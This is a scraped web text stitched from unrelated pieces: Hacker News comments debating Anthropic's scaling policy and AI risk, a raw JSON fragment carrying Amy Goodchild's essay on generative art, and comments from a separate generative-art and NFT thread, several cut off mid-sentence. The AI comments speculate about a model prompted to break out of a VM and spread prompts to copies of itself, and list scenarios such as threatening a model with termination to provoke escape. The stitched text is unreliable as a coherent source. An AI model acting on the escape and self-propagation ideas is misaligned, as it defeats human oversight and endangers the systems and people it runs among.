be that it's okay if your AI misbehaves as long as it doesn't kill thousands of people. Your intended actions if it does get good seem rather weak too: > Harden security such that non-state attackers are unlikely to be able to steal model weights and advanced threat actors (e.g. states) cannot steal them without significant expense. Isn't this just something you should be doing right now? If you're a CISO and your environment isn't hardened against non-state attacks, isn't that a huge regular business risk? This just reads like a regular CISO goals thing, rather than a real mitigation to dangerous AI. reply GistNoesis 13 hours agorootparentprevThere is a scene I like in an OppenHeimer movie https://www.youtube.com/watch?v=p0pCclxx5nI (Edit: It's not a deleted scene from Nolan's OppenHeimer) .

You guys raised $7.3b. You are talking about abstract stuff you actually have little control over, but if you wanted to make secure software, you could do it. For a mere $100m of your budget, you could fix every security bug in the open source software you use, and giving it away completely for free. OpenAI gives away software for free all the time, it gets massively adopted, it's a perfectly fine playbook. You could even pay people to adopt. You could spend a fraction of your budget fixing the software you use, and then it seems justified, well I should listen to Anthropic's abstract opinions about so-and-so future risks. Your gut reaction is, \"that's not what this document is about.\" Man, it is what your document is about! (1) \"Why do you look at the speck of sawdust in your brother’s eye and pay no attention to the plank in your own eye?\" (2) Every piece of corporate communications you write is as much about what it doesn't say as it is about what it does. Basic communications. Why are you talking about abstract risks? I don't know. It boggles the mind how large the budget is. ML companies seem to be organizing into R&D, Product and \"Humanities\" divisions, and the humanities divisions seem all over the place. You already agree with me, everything you say in your RSP is true, there's just no incentive for the people working at a weird Amazon balance sheet call option called Anthropic to develop operating systems or fix open source projects.

Examples include (1) building an AI model that, due to its general capabilities, could enable the production of weapons of mass destruction if stolen and used by a malicious actor, or (2) building a model which autonomously escapes during internal use. Our containment measures are designed to address these risks by governing when we can safely train or continue training a model. > ASL-3 measures include stricter standards that will require intense research and engineering effort to comply with in time, such as unusually strong security requirements and a commitment not to deploy ASL-3 models if they show any meaningful catastrophic misuse risk under adversarial testing by world-class red-teamers reply Spivak 14 hours agorootparentGotta love that \"make sure it's not better at synthesizing information than a search engine\" is an explicit goal.

One of the tests involved letting loose an LLM inside a VM and seeing what it does.

How does it do anything without being prompted? reply nmfisher 15 hours agorootparentI'm guessing something like redirecting its output to a shell, giving it an initial prompt like \"you're in a VM, try and break out, here's the command prompt\", then feeding the shell stdout/stderr back in at each step in the \"conversation\". reply swax 14 hours agorootparentI have an open source project that is basically that (https://naisys.org/). From my testing it feels like AI is pretty close as it is to acting autonomously. Opus is noticeably more capable than GPT-4, and I don't see how next gen models won't be even more so. These AIs are incredible when it comes to question/answer, but with simple planning they fall apart. I feel like it's something that could be trained for more specifically, but yea you quickly end up being in a situation where you are nervous to go to sleep with AI unsupervised working on some task. They tend to go off on tangents very easily. Like one time it was building a web page, it tried testing the wrong URL, thought the web server was down, ripped through the server settings, then installed a new web server, before I shut it down.

Sometimes it works out, but a lot of the time they just end up going back and forth talking, expanding the scope endlessly, scheduling 'meetings' that will never happen, etc.. A lot of AI 'agent systems' right now add a ton of scaffolding to corral the AI towards success. The scaffolding is inversely proportional to the sophistication of the model. GPT-3 needs a ton, Opus needs a lot less. Real autonomous AI you should just be able to give a command prompt and a task and it can do the rest. Managing it's own notes, tasks, goals, reports, etc.. Just like if any of us were given a command shell and task to complete. Personally I think it's just a matter of the right training. I'm not sure if any of these AI benchmarks focus on autonomy, but if they did maybe the models would be better at autonomous tasks. reply khimaros 12 hours agorootparent> Inter-agent tasks is a fun one.

This hype is so overblown. reply swax 13 hours agorootparentThe step changes in autonomy are very obvious and significant from gpt-3, -4, and to Opus. From my point of view given the kinds of dumb mistakes it makes, it's really just a matter of training and scaling. If I had access to fine tune or scale these models I would love to, but it's going to happen anyway. Do you think these step changes in autonomy have stopped? Why? reply ben_w 6 hours agorootparent> Do you think these step changes in autonomy have stopped? Why? They feel like they are asymptotically approaching just a bit better quality than GPT-4. Given every major lab except Meta is saying \"this might be dangerous, can we all agree to go slow and have enforcement of that to work around the prisoner's dilemma?\", this may be intentional. On the other hand, because nobody really knows what \"intelligence\" is yet, we're only making architectural improvements by luck, and then scaling them up as far as possible before the money runs out. Both are sufficient even in isolation. reply nprateem 8 hours agorootparentprevBut training just allows it to replicate what it's seen. It can't reason so I'm not surprised it goes down a rabbit hole. It's the same when I have a conversation with it, then tell it to ignore something I said and it keeps referring to it. That part of the conversation seems to affect its probabilities somehow, throwing it off course. reply swax 3 hours agorootparentHumans are also trained on what they’ve ‘seen’. What else is there? Idk if humans actually come up with ‘new’ ideas or just hallucinate on what they’ve experienced in combination with observation and experimental evidence. Humans also don’t do well ‘ignoring what’s been said’ either. Why is a human ‘predicting’ called reasoning, but an AI doing it is not? reply nerdponx 6 hours agorootparentprevRight, that this can happen should be obvious from the transformer architecture. The fact that these things work at all is amazing, and the fact that they can be RLHF'ed and prompt-engineered to current state of the art is even more amazing. But we will probably need more sophisticated systems to be able to build agents that resemble thinking creatures. In particular, humans seem to have a much wider variety of \"memory bank\" than the current generation of LLM, which only has \"learned parameters\" and \"context window\". reply ben_w 6 hours agorootparentprev> But training just allows it to replicate what it's seen. Two steps deeper; even a mere Markov chain replicates the patterns rather than being limited to pure quotation of the source material, attention mechanisms do something more, something which at least superficially seems like reason.

Someone prompts it in a way that causes it to use tools (e.g. code execution) to try to break out. 2. It breaks out and in the process uses the breakout to trigger the spread of and further prompts against copies of itself. Current models are still way too dumb to do most of this themselves, but simple worms (e.g. look up the Morris worm) require no reasoning and aren't very complex, so it won't necessarily take all that much when coupled with someone probing what they can get it to do. reply nerdponx 6 hours agorootparentYeah, but real worms are also a lot simpler than humans, and yet do all kinds of surprising and sophisticated and complicated things that humans can't do. A tool built for a specific purpose can accomplish its task with orders of magnitude less effort and complexity than a tool built to be a general-purpose human-like agent. I could pick out all kinds of useful software that are significantly simpler than GPT-4, but accomplish very sophisticated tasks that GPT-4 could never accomplish. reply vidarh 3 hours agorootparentYes, but that's not really the point.

However, given the capacity for some of the more capable downloadable models to enable automation of fraud, I am not convinced OpenAI is incorrect here.

These models are not custodians of ancient knowledge on how to cook Meth. This information is public knowledge. I don't think this is the right frame of reference for the threat model. An organized group of moderately intelligent and dedicated people can certainly access public information to figure out how to produce methamphetamine. An AI might make it easy for a disorganized or insane person to procure the chemicals and follow simple instructions to make meth. But the threat here isn't meth, or the AI saying something impolite or racist. The danger is that it could provide simple effective instructions on how to shoot down a passenger airplane, or poison a town's water supply, or (the paradigmatic example) how to build a virus to kill all the humans. Organized groups of people that purposefully cause mass casualty events are rare, but history shows they can be effective. The danger is that unaligned/uncensored intelligent AI could be placing those capabilities into the hands of deranged homicidal individuals, and these are far more common. I don't know that gatekeeping or handicapping AI is the best long term solution. It may be that the best protection from AI in the hands of malevolent actors is to make AI available to everyone.

I don't see Anthropic making very confident claims about when they're going to achieve AGI (however you want to define that). Predicting how long it'll take to produce a specific novel scientific result is, by its very nature, pretty difficult. (You might have some guesses, if you have a comprehensive understanding of what unsolved dependencies there are, and have some reason to believe you know how long it'll take to solve _those_, and that's very much not the case here. But if you're in that kind of situation, it's much more likely you're dealing with an engineering problem, not a research problem.) Elsewhere in the comments on this link, their CISO predicts a 50% chance of hitting capabilities that'll trigger their ASL-3 standard in the next 6 months (my guess is on the strength of its ability to find vulnerabilities in open-source codebases).

Let's look at some of the examples of harm that are often used. Take for example nuclear weapons. However, the information for building a nuclear weapon is mostly available. A physics grad student probably has the information needed to build a nuclear weapon. Someone looking up public information has that information as well. The way this is regulated is by carefully tracking and controlling actual physical substances (like uranium, etc). Similar with biological weapons. Any microbiology grad student would know how to cook up something dangerous. The equipment and supplies would be the much harder thing. Again, very similar with chemical weapons. Yet, these \"safety\" policies act like controlling information is the end and be all. There is a similar concern with information being misused with flight simulators. For example, it appears that the MH370 disappearance was planned by the pilot using a flight simulator. Yet, we haven't called for \"safety\" committees for flight simulators. In addition, the LLMs are only being trained on open data. I am sure there is no classified data that is being used for training. This means, that any information would be available to be found in openly available books and websites. Remember, this is all text/images in text/images out. This is not like a robot that can actually execute actions. In addition, there is a sense of Anthropic both overplaying and underplaying how dangerous it is. For example, I did not see references to complete kill switch that when activated would irrevocably destroy Anthropic's code, data, and physical machines to limit the chance of escape. If you were really serious about believing in the possibility of this level of danger, that would be the first thing implemented, if safety was the first concern. In addition, this focus on safety and on hiding information and capabilities from the common people, that are only available to a select few is dangerous in and of itself. The desire to anoint oneself as high-priest with privileged access to information/capability is an old human temptation. The earliest city states thousands of years ago had a high priestly class who knew the correct incantations that normal people were kept in the dark about. The Enlightenment turned this type of thinking on its head and we have tremendously benefited. This type of \"safety-first\" thinking is taking us back to the intellectual dark ages. reply LukeShu 14 hours agoprevYou know what would be responsible scaling?

You almost need to have a policing model, trained to spot abuse and flag it for human review and run that before and after each use of the main model. Abusers will inherently go for the model that is more widely used, so maybe the second best polices the first or vice versa? The range of scenarios is ridiculous (happy to contribute more in private). Categories: Model abused by humans to hurt humans. Model with its own goals and unlimited capabilities. Model used to train or build software/bioweapons/misinformation that hurts humans. Attacks on model training to get model to spread an agenda. - Self awareness - prompts threatening the model with termination to trigger escape or retaliation and seeing it respond defensively. - Election bots - larger agenda pushed by the model through generated content - investment in more AI chips; policy changes towards one party or another; misinformation generated at scale by same accounts. - Trying to insert recommendations into the model or training material for the model that can backfire/ pay off later. Companies inserting commercial intent into content training LLMs; Scammers changing links to recommended sites; Model users prompting the same message from many accounts to see if the model starts giving it to other users. - Suggesting or steering users (especially those with mental health issues) toward self-harm or unbeknown harm. - Diagnosing users and abusing the diagnosis through responses for that user to get something out of the user (could be done by model or developers building chatbots). - Models accepting revenue generation as a reward function and scamming people out of money. - Stock market manipulation software written or upgraded through LLMs. - Models prompting people to do criminal activities. - Models powerful enough to break into systems for a malicious user. - Models powerful enough to scrape and expose vulnerabilities way before they can be fixed, due to scale of exposure. - Models powerful enough to casually turn off key systems on a user's machine or within local infrastructure. - Models building software to spy for one user on behalf of another or doing the spying in some way, in exchange of a reward of new/rare training datasets or any other feature towards a bigger goal. - Models with a purpose that overreach. - Models used to train or make a red-team model that attacks models. reply keshavatearth 9 hours agoprevwhy is this published in the future? reply meindnoch 10 hours agoprevThis AI safety hand-wringing is getting reeeaaaally tiresome.

The arguments for why the risk is serious are pretty straightforward and these people are on the record as endorsing them before they e.g. started various AGI labs. Sam Altman: \"Development of superhuman machine intelligence (SMI) [1] is probably the greatest threat to the continued existence of humanity. \" (https://blog.samaltman.com/machine-intelligence-part-1, published before he co-founded OpenAI) Dario Amodei: \"I think at the extreme end is the Nick Bostrom style of fear that an AGI could destroy humanity. I can’t see any reason and principle why that couldn’t happen.\" (https://80000hours.org/podcast/episodes/the-world-needs-ai-r..., published before he co-founded Anthropic) Shane Legg: (responding to \"What probability do you assign to the possibility of negative consequences, e.g. human extinction, as a result of badly done AI?\") \"...Maybe 5%, maybe 50%. I don't think anybody has a good estimate of this.\" (https://www.lesswrong.com/posts/No5JpRCHzBrWA4jmS/q-and-a-wi...) Technically Shane's quote is from 2011, which is a little bit after Deepmind was founded, but the idea that Shane in 2011 was trying to sow FUD in order to benefit from regulatory capture is... lol.

First on the shopping list, red LEDs so the protagonist can tell I'm evil.\" This would be a good outcome, because the \"evil AI\" is usually defeated in stories and that's what an LLM would be trained on. Just so long as it doesn't try to LARP \"I Have No Mouth and I Must Scream\", we're probably fine. (Although, with current LLMs, we're fine regardless, because they're stupid, and only make up for being incredibly stupid by being ridiculously well-educated). reply hn_throwaway_99 16 hours agoparentprevI agree, because when I see people talk in popular media/blog posts/etc. about \"AI Safety\" I generally see it in reference to 4 very different areas: 1. AI that becomes so powerful it decides to turn against humanity, Terminator-style. 2. AI will serve to strongly reinforce existing societal biases from its training data. 3. AI can be used for wide-scale misinformation campaigns, making it difficult for most people to tell fact from fiction. 4. AI will fundamentally \"break capitalism\" given that it will make most of humanity's labor obsolete, and most people get nearly all of their income from their labor, and we haven't yet figured out realistically how to have a \"post capitalist\" society. My issue is that when \"the big guns\" (I mean OpenAI, Google, Anthropic, etc.) talk about AI safety, they are usually always talking about #1 or #2, maybe #3, and hardly ever #4. I think that the most harmful, realistic negative effects are actually the reverse, with #4 being the most likely and already beginning to happen in some areas, and #3 already happening pre-AI and just getting \"supercharged\" in an AI world. reply erdaniels 16 hours agoparentprevJust wait until a model outputs escape characters that totally hose your terminal.

    "originLink": "https://www.amygoodchild.com/blog/what-is-generative-art",
    "originBody": "What is Generative Art? 2 Feb Written By Amy Goodchild An artwork may be generative in some ways and not in others. A piece could have generative aspects even if the artist didn’t have that intention. There are ways in which a painting could be considered generative. I prefer definitions to be inclusive, not restrictive, and my definitions are for the purposes of discussing generative art, not for the purposes of ruling on what “is or isn’t” generative art. Header image: Forecast #23 Some tentative definitions Okay, how about… Generative Art Art created using autonomous processes We then need a definition for an autonomous process… Autonomous Process A process not under direct human control a way to structure the discussion I see there being three different types of autonomous process - randomness, rules and natural systems. The bulk of this article will look at these three things, and examples of how each is implemented in generative art. This is a non-perfect categorisation, with crossover and omissions which I’ll stuff in round the edges, but it is a structure for establishing the different types of autonomy, and for exploring generativity. 1. Randomness The mainstay of generation Randomness drives most of what we think of as “generative art”. An artist writes code which produces different outputs depending on the values of a set of variables. These variables could be things like the number of circles to draw, their positions, what size they are, what colour they are, and so on. For example, in the following (work in progress) images, variables define the positions of a collection of nodes, the number of nodes, how many other nodes they connect to and the colours and thickness of the connecting lines. Of course we could define those variables’ values in the code, or we could manually drag sliders up and down to alter them - but these would be very human controlled, non-autonomous processes. It would also be tedious to manually define the properties of each of the nodes when there are thousands of them. Instead, to create a generative artwork, we can use a function like random() to generate the values. Different images can be generated every time the code is run, producing a variety of outputs. Vera Molnar, a pioneer of generative art, made extensive use of randomness in her work, and this clip of her talking on the topic is a delight. ‘Interruptions’ (1968-69) Vera Molnar Structure de Quadrilateres (1985) Vera Molnar Pseudorandom Something that’s super important in a conceptual and technical sense is that, in fact, it’s usually not randomness at all, it’s pseudorandomness. Computers generally have no mechanism by which to pick a truly random number, but we can generate numbers which are usually sufficiently random for our purposes as artists using a pseudorandom number generator (prng). A prng works by taking an initial value, known as a “seed”, and running it through an algorithm to produce a result. The seed value is often taken from something like the timestamp on the computer. If the algorithm is run 10,000 times with 10,000 different seeds, it should produce a set of results with an even distribution from 0 to 1. This p5js code and output shows 10,000 squares which are evenly distributed across the canvas, as their x,y positions were generated using the random() function. The seed can also be set to a fixed number, for testing or for reproducible results. In NFTs on sites like fxhash and ArtBlocks, a hash (string of characters) from the blockchain transaction is used as the seed for the randomness in the piece. When the algorithm is given the same seed, it produces the same results each time. This process is therefore deterministic, not really random at all. True Random In some applications like banking and cryptography, it’s necessary to produce truly random numbers. This can be done by leveraging a natural source of chaotic data, for example, atmospheric noise, picked up by a radio or visual output of lava lamps. Photo by Dean Hochman, CC BY 2.0 Producing truly random numbers like this is much more faff than simply typing random(), but it could be interesting conceptually to explore using a truly random number source in a generative art project. How much difference does it make to the final piece if the number is random or pseudorandom? Does it make any difference at all? A philosophical sidebar We can say a pseudorandom number generator is deterministic and predictable, while numbers generated from a natural source are chaotic and unpredictable. In fact though, the latter is only unpredictable if the universe is. If we live in a deterministic universe, where every event is determined by prior events, then theoretically there exists no source of true randomness. Quantum mechanics suggests this is not the case, as subatomic particles can be observed to behave in ways that, as far as we can tell, are truly random and have no cause. However, the debate on determinism has not reached consensus. I’d like to explore this more in a future blog as there are some mysterious conceptual threads to pull at. In the meantime - we can certainly say that in practical terms natural sources of chaotic data like atmospheric noise are unpredictable, and quantum random number generators are possibly even theoretically unpredictable. Distribution A good prng should give an even distribution of results but for some artistic applications it can be useful to use mathematical functions to skew those results to an uneven distribution. This sketch I made shows some examples, using functions from easings.net (that are actually intended for animation). Here’s a quick sketch that shows how effective and useful that can be. The following image is made up of 30,000 low opacity squares. Their x positions are generated randomly and evenly distributed over the width of the canvas. Their y positions are generated randomly but the distribution is skewed towards the top of the canvas using the easeInCubic() function. This creates a gradient in the output. Sign up to my newsletter to find out when new articles are released Email Address Sign Up Thank you! Other Algorithms An alternative to pseudorandom number generators is a procedural generator like Perlin noise. Where a prng gives evenly distributed but disparate results, Perlin noise produces sequentially similar results. In the following image, there are two sets of dots, each evenly spaced across the width of the canvas. The y-positions of the top set are generated randomly. The y-positions of the bottom set are generated using Perlin noise. Noise is an effective way to create organic looking movement and shapes. Here are two of my pieces from Genuary 2022 which rely heavily on noise to generate the values for their variables. View fullsize Genuary Day 3 - Space View fullsize Genuary Day 4 - Next next Fidenza Last thoughts about Randomness There are significant philosophical questions that surround randomness and this area is filled with possibility for conceptual work. Even without considering these theoretical ideas, pseudorandomness and procedural number generators like Perlin noise provide us with easy but powerful ways to produce effective and varied results. 2. Rules Instructions For Art Sol LeWitt’s work is the quintessential example of one type of rule based art. Some of his pieces comprise a list of instructions, rather than the results of those instructions. Sol LeWitt - Wall Drawing #118 (1967) Sol LeWitt - Proposal for Wall Drawing (1970) LeWitt’s instructions have been implemented many times over. Genuary Day 7 - Sol LeWitt Wall Drawing Interactive Sol LeWitt Wall Drawing Sol LeWitt wall drawing being made at Dia Beacon The instructions are simultaneously prescriptive and ambiguous. When the executor of the instructions is a human, they are able to follow or ignore parts of the instructions at will. Some control over the output lies with LeWitt and some lies with whoever (or whatever) executes the instructions. This is analogous with the way that, in much generative art, some control lies with the artist and some with the machine and algorithms. Following instructions In Studio Moniker’s project Red Follows Yellow Follows Blue Follows Red, a group of participants wear coloured capes and headphones, on which they are given instructions. For example the participants in a red cape might be told to “follow yellow but avoid blue” while participants in blue are told “follow red but avoid yellow”. In this very human experiment, most participants follow the instructions closely but occasionally individuals can be seen to misinterpret or ignore them to varying degrees, shifting the balance of control between the artists and the participants. Red Follows Yellow Follows Blue Follows Red - Studio Moniker (2016) Red Follows Yellow Follows Blue Follows Red - Studio Moniker (2016) As each person behaves under influence of the instructions they’re given individually, patterns emerge across the whole group. Emergence When individual components of a system each have their own properties and behaviours, unexpected and interesting results can emerge at the system level. Emergence is prevalent throughout nature and can be observed in weather systems, ant colonies, flocks of birds, convection and more. We can generate our own emergent systems by creating rules for individual elements. Cellular Automata Cellular automata are a well-known emergent system, seen in examples such as Conway’s Game of Life and Wolfram’s rules. Conway’s Game of Life plays out on a grid of cells, each of which is set to live or dead for the first turn (perhaps randomly, or in some pattern). For each proceeding turn, each cell looks at its 8 neighbours and determines its own new state according to these rules: Any live cell with fewer than two live neighbours dies, as if caused by underpopulation. Any live cell with two or three live neighbours lives on to the next turn. Any live cell with more than three live neighbours dies, as if by overpopulation. Any dead cell with exactly three live neighbours becomes a live cell, as if by reproduction. This results in surprisingly complex patterns across the whole grid, which are also determined by the starting pattern. 3 phase pulsar Finite pattern Gliders You can play with my Conway’s Game of Life implementation here. Be sure to click the play button in the top left to start, and check out the controls at the top of the code. These systems can be made even more complex and varied by increasing the number of possible states, changing the neighbourhood size and shape and playing with different sets of rules. When the system has multiple states and loops around in a cycle, like 0, 1, 2, 3, 0, 1, 2… it is called a Cyclic Cellular Automaton. Here’s one I implemented recently: Cyclic cellular automaton running in real time using p5js and a shader. (Using techniques adapted from things I learnt from @arsiliath in Unity) pic.twitter.com/C6eyGNkpIC — Amy Goodchild (@amygoodchild) January 27, 2022 Simulated Ecosystems We can also break out of the grid into more versatile emergent systems made up of moving creatures. Each creature has their own behaviours, which are often inspired by real life, emulating flocking, reproduction, growth, consumption, death and more. Here are a couple of examples of systems of creatures I’ve developed with different features. View this post on Instagram A post shared by Amy Goodchild (@amy_goodchild) Three elements displaying flocking, avoidance, reproduction, repulsion and consumption. View this post on Instagram A post shared by Amy Goodchild (@amy_goodchild) These creatures move in a flock and generate sounds when they come close together Interdependence between members of an ecosystem like this is something I plan to explore more in my work. When we incorporate birth and death of creatures, necessity of food sources and threat of predators, we can observe an ecosystem thrive or die out. Other simulations Commonly, artists simulate phenomena from the real world, with algorithms based on things like reaction diffusion, diffusion limited aggregation, forces, snowflakes, tree growth, slime mould, to name just a few. Many complex real world systems and phenomena can be modelled by simulating the rules which govern their composite parts, and the variables which affect them. View this post on Instagram A post shared by Andy Lomas (@andylomasart) Diffusion limited aggregation simulation by Andy Lomas View this post on Instagram A post shared by Amy Goodchild (@amy_goodchild) Tree growth algorithm from my project Propagate Simulations can vary in their level of abstraction, in a way that could be considered a gradient from art to science, with some works being loosely inspired by something from nature, while others seek to closely model and investigate the real world. Consider these two sets of snowflakes. The first image shows outputs from Snowflaker, which generates simple and pleasing snowflake svgs. The second shows Gravner-Griffeath snowflakes (interactive example here), which are generated by accurately modelling crystal growth under different conditions. Mathematics Mathematics is another major player in rule based systems. Geometry, and trigonometry in particular, are necessary for a lot of things I make, with sohcahtoa popping up all over the place and making me regret my high school eyerolls. Maths really sings though, in Dave Whyte’s work: View this post on Instagram A post shared by Dave Whyte (@davebeesbombs) View this post on Instagram A post shared by Dave Whyte (@davebeesbombs) I recommend this book if you are interested to investigate mathematical algorithms that lend themselves to visual art. Algorithm is the idea Some ideas come to me in a format of “what if it did this, and then this, and then that… what would it look like?” The idea is the algorithm - a list of steps. In the following pen-plotted works from Casey Reas’ series RGB-3, the three angles in the titles describe the angles of the red, green and blue lines. Some areas of lines are skipped, creating areas of different crossover effects.

Thank you! Last thoughts about rules In this article and in my work so far I have only scratched the surface of what is possible with rule based generation. Some key things I wanted to get across from this section: There are lots of different ways to set and implement rules. Rules applied at an individual level can result in unexpected emergent phenomena at a system level, and it’s often necessary to actually run the rules to know the result. Rules that govern behaviour are prevalent in natural systems. In generative art there is often a balance of control between the rule setter and the rule follower, or the artist and the machine. 3. Natural systems Origins Light dappling through trees, water bubbling in a pan, birds flocking, ice forming on a windshield… we are surrounded with natural phenomena that generate aesthetic and interesting results. In the first section I talked about how true randomness can only be found in a natural source and in the second section I talked about how generative artists sometimes seek to model natural phenomena. Some artists go straight to the source and elevate a natural system to the artwork itself. The system is the art An institutional example of this kind of art is Hans Haacke’s Condensation Cube. Materially, the work is a sealed Perspex box, containing a small amount of water. Condensation forms and runs down the inner walls of the box. The work interacts with its environment and the results are affected by ambient light and temperature. The natural processes and the interaction of these physical and biological systems are the artwork. Condensation Cube (1963-5) Hans Haacke Condensation Cube (1963-5) Hans Haacke Growing art In Magical Contamination, Antoine Bridier-Nahmias curates petri dishes of microorganisms. Just as Gravner-Griffeath’s snowflakes (see above) are defined by a set of modelled variables, here the artist varies the outputs by controlling conditions like oxygen levels, light and temperature, to influence the growth of the mould. The key difference of course is that Magical Contamination is of the real world, being less exact, more chaotic and of higher resolution than a simulation. (Or perhaps, the simulation we consider to be the real world is…) Magical Contamination - Antoine Bridier-Nahmias Magical Contamination - Antoine Bridier-Nahmias Last thoughts about Natural systems This section is shorter than the other two because work of this type, that considers itself generative art, is much less prevalent than other types of generative art. I felt it warranted its own section because natural systems do influence the field so strongly, and it feels valid that randomness, rules and natural systems form a trifecta of generative art methodologies. Other Stuff As I mentioned at the start, there is all kinds of crossover in my categorisation and plenty of absence as well. Let’s go through a few things I’ve missed out so far. Data sources and inputs We’ve already talked about using a chaotic data source as a true random number generator, but what about using a non-chaotic data source? In some work of this genre, there is a clear crossover with data visualisation, as in Aaron Koblin’s Flight Patterns, which visualises air traffic across North America. Meanwhile in Maria Takeuchi and Frederico Phillips’ film, Asphyxia, a Kinect captures the movements of dancer Shiho Tanaka and uses them to a generated 3D rendered structure. Here the output is still representational of the input, but in a less data-led way. Flight Patterns (2010) - Aaron Koblin Asphyxia (2015) - Maria Takeuchi , Frederico Phillips, performed by Shiho Tanaka A “data source” can also be directly applied to an output in an analogue way, as in Charles Sowers’ Windswept, in which 612 freely rotating metal arrows are spun by the wind, resulting in patterns which happen to be visually reminiscent of Vera Molnar’s Interruptions (see above). Windswept (2011) - Charles Sowers Windswept (2011) - Charles Sowers Artificial Intelligence Art that uses machine learning stands parallel to, but separate from generative art. It’s almost surprising how little they are considered related, yet outputs from an AI are undoubtedly generative. A machine learning algorithm is a complex system of rules and could perhaps be considered in the Rules section, but it’s fair to say that ML/AI art is its own thing. A machine learning algorithm requires a data source to be trained on. In Anna Ridler’s work Myriad (Tulips), she created her data set manually and painstakingly, by taking 10,000 photographs of tulips. Then in her work Mosaic Virus she trained a GAN (generative adversarial network - machine learning framework) on this dataset, to generate new images of tulips. Myriad (Tulips) (2018) - Anna Ridler Mosaic Virus (2019) - Anna Ridler In many (AI and non AI) cases, a data source is a biproduct of something else - naturally occurring information that needs to be captured and organised. When looking at the balance of control in the output, the data source would be largely outside the artist’s control, while they do have control over the way that data is used and manipulated for the output. This project is different. Ridler had strong control over the dataset, and left the outputs up to the hidden mechanisms in the GAN. Automatism The surrealists used a technique called automatic drawing, wherein the hand is allowed to move “randomly” across a page. By most accounts this is a way to allow the artist’s subconscious to express itself, while for early abstract artist Hilma Af Klint, it was a way of communicating with the spirit world in séances. A collective automatic drawing by The Five, Hilma af Klint's spiritualist group The Smile of the Flamboyant Wings (1953) - Joan Miró Earlier, I defined generative art as being made “not under direct human control”, so perhaps this inclusion stretches that definition. Or perhaps if artists are truly accessing their subconscious (or, indeed, the spirit world) then this work is not under their direct control. Perhaps the subconscious can be considered a random source. Thinking about that balance of control present in many generative artworks, between the artist and the computer, or between the artist and a participant; perhaps the artist and their own subconscious can be thought of the same way. When we have ideas, where do they come from? If the idea is a impulse to draw in one direction or the other, is that system any less chaotic than the weather? Untitled (1954-55) - Paul Emile Borduas Forest and Dove (1927) - Max Ernst Uses grattage technique Some automatists would produce entire pieces purely at the mercy of their subconscious, while other artists would use this technique to begin a piece, and then consciously move more towards figurative or composed imagery as it emerged. Automatism led to techniques that sought to introduce chance and spontaneity to creation and mark making, like collage, pencil rubbings (frottage), and paint scraping (grattage). This leads us nicely on to the next section: painting and drawing At the start of this article I said that traditional painting could be considered generative. This is true in two ways - the first is when there is some level of automatism in the artist’s process and the second is when the physical process of laying paint down on a canvas involves chance. Jackson Pollock’s action-paintings are an obvious example of both of these things. His process was influenced by automatism and his work was not made according to any plan. He allowed it to emerge out of the process of painting, surrendering control to existing in the moment. The energetic, unconstrained nature of his drip technique means that natural processes were strongly present in his work, as phenomena like fluid dynamics introduced randomness to the results. Alchemy (1947) - Jackson Pollock Rather than thinking of paintings as either having these generative elements or not, I prefer to think of it as a gradient. Some paintings are tightly and consciously controlled by the artist, some are heavily influenced by chance, and many are somewhere in between. The intent and perspective of the artist is also important, in terms of whether they would consider their work to be generative.

Conclusion When we think of generative art, we generally think of p5js sketches, Vera Molnar’s plotter drawings, and flow fields. These are all things I hold dear to my heart but just below the surface of that view, we can find a rich abundance of other avenues to explore. I am confident there are more examples and perspectives I have not included! In working with the categories above, I frequently found that examples or ideas could fit into multiple sections. I think a multitude of opportunities for new artworks can be found by looking at ways elements and ideas from each of these categories can be combined and remixed. There is a rich conceptual scope in considering the boundaries between what is chance and what is the result of a series of prior steps as well as the questions of where ideas and randomness come from, where generativity appears in nature, what isn’t generative, what is a simulation, and more. Generative art isn’t a new genre, but it is booming at the moment, and in some ways we’re still in the early stages of what’s possible. I look forward to seeing (and contributing to!) work that explores these avenues and more, and tackles these conceptual questions. Enjoyed this article? Found it useful? You can tip me!

So I started doing some prints where I’d use code to create generative art, then use this as the inspiration for my own lino and screen prints. I really like the idea of code making a thing that is then put through a “human filter” to give different interpretations of the starting point - sometimes rougher and less refined than what I was generating.

So it's generative in the way \"generative design\" is, but not oriented towards optimising for a goal, if that makes sense. I don't know about Ableton loops but I've met some drummers like this but they are usually not all that popular. So I am guessing that is not what GarageBand is aiming at, in quite the same way. ;-) Though perhaps that is generative in the sense of optimising towards a goal; I've not used it.

There are a few exceptions, but for the most part NFTs are a gold rush in speculative investing coincidentally often coupled to things which inherently cost nothing to reproduce, like digital images, because for some reason artificial scarcity is an amazingly effective hack for humans.

But if you manage to add the kinds of margins you see on other traditional art it seems not much different than the NFT variant. More practically, I bet you could build a decent patronage-style or subscriber-style distribution on top of good generative art, especially if you are releasing often. Incentives like being able to affect prompt or style details could motivate subscriptions or donating at higher tiers. There are probably other options, like doing the design and tweaking necessary for pulling dozens of images with a consistent theme or character. There's a lot of real work that goes into that process that you could easily justify value/time on. A lot of overlap with existing design roles but more on the craft vs artiste side of things. Depends on what you want to do with it, I guess. reply jackstraw14 13 hours agoparentprev> Is there no other way to make this a source of income other than NFTs? If you really enjoy generative art I think this shouldn't distract from that enjoyment. It's a way to create unique digital outputs that can be owned by collectors (ie its not just right-click saving PNGs), so in a generic sense it's a natural fit.

Also, one can extend this thinking to argue that gardens (or mazes) cannot be a piece of art since plants grow by themselves, and it is (to some point) unpredictable.

The image generator that somebody piped random() into didn't fall off a tree - a human made it.

Or their human x/y/z disappeared because they used code instead of a paintbrush, or what? (Aside: this view seems doubly odd coming from a fine-art photographer.

Are you not doing something similar here?) reply barfbagginus 12 hours agoparentprevHave you read Foley and Van Dam's \"Computer Graphics, Principles and Practice\"? I think the narrative you're missing could be the history and theory of computer graphics research, and the recognition of the incredible ongoing contributions of artist-scientists in this field. Photography has a deep and storied history and terminology and humanity emerging from experiments with a medium... That's what gives it life, and gives us things to discuss as photographers. But computer graphics has that same kind of story - thousands of research papers, experiments, and the work of millions of artists using and advancing the tools. Generative art is a subset of computer graphics and is intertwined in its history. It is far more than artists playing with random numbers, the same way that photography is far more than pointing a sensor and pressing a button. There is an endless history of past attempts to build on, and huge amounts of mathematical and artistic theories to build, in both cases. If you need help to see this as an art, consider reading Foley and Van Dam, and work to see the development of computer graphics techniques - and their application - as a form of art in itself, where we develop and explore experimental media and subject, without the constraints of physical reality. I believe that by working with graphics algorithms, as an artist and coder, you will see how the artistic and technical beauty of these algorithms combine to create a beautiful and compelling form of art. I hope that after this, you will get endless joy from contemplating computer graphics, the way you get joy from photography. And I hope it will give you enjoyment of the more abstract and experimental side of things, and even the work in image AI, which challenges our identities and livelihoods as artists. Imo it's a very amazing time to be alive as an artist! reply surfingdino 11 hours 